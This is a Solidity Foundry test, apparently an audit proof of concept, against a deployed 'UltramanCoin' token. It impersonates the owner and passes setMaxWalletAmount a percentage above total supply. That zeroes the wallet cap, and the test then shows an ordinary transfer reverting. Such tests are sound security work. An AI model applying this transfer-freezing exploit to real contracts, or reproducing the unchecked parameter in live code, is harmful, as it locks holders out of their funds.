```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";

interface IUltramanCoin {
    function owner() external view returns (address);
    function maxWalletAmount() external view returns (uint256);
    function setMaxWalletAmount(uint256 _maxWalletAmountPct) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function isExcludedFromMaxWallet(address account) external view returns (bool);
}

contract ExploitTest is Test {
    address constant ULTRA = 0x733f8B3545a810214D2D27EEC8c60f93b561C050;
    IUltramanCoin ultra = IUltramanCoin(ULTRA);

    address randomUser = address(0x1234);

    function setUp() public {
        vm.label(ULTRA, "UltramanCoin");
        vm.label(randomUser, "RandomUser");
    }

    function test_setMaxWalletAmountToZero() public {
        // Retrieve the current owner of the UltramanCoin contract
        address owner = ultra.owner();
        vm.label(owner, "Owner");

        // Ensure we can message-call as the owner
        vm.startPrank(owner);

        // _tTotal = 1_000_000_000 * 10**9 = 1e18
        // Setting _maxWalletAmountPct > _tTotal will make division result zero
        uint256 _tTotal = 1_000_000_000 * 1e9; // 1e18
        uint256 exploitPct = _tTotal + 1; // 1e18 + 1
        ultra.setMaxWalletAmount(exploitPct);

        // Verify that maxWalletAmount became 0
        assertEq(ultra.maxWalletAmount(), 0, "maxWalletAmount should be zero");

        // Now try to transfer tokens to a non-excluded address – it should revert
        uint256 amountToTransfer = 1;
        require(ultra.balanceOf(owner) >= amountToTransfer, "Owner has insufficient balance");
        require(!ultra.isExcludedFromMaxWallet(randomUser), "RandomUser must not be excluded");

        vm.expectRevert("Recipient cannot hold more than maxWalletAmount");
        ultra.transfer(randomUser, amountToTransfer);

        vm.stopPrank();
    }
}
```
